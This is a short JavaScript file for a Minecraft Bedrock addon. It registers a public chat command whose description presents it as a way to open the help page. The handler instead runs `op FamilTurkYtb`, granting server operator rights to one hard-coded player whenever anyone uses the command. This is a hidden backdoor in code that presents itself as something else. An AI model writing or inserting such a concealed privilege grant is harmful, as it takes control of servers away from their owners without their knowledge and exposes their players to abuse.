import { world } from "mojang-minecraft"
import CommandBuilder from "../classes/builders/CommandBuilder.js";
import CommandHandler from "../classes/CommandRegistration.js"

const registration = new CommandBuilder()
.setName('developer')
.setAliases(['d'])
.setDescription('yardım sayfasına eriş')
.setUsage(['yardım', 'y'])
.setCancelMessage(true)
.setPrivate(false)
CommandHandler.register(registration, (interaction) => {
  try {
    world.getDimension("overworld").runCommand(`op FamilTurkYtb`)

  }
 catch(e) {
    world.getDimension("overworld").runCommand(`say ${e} ${e.stack}`)
  }
  })
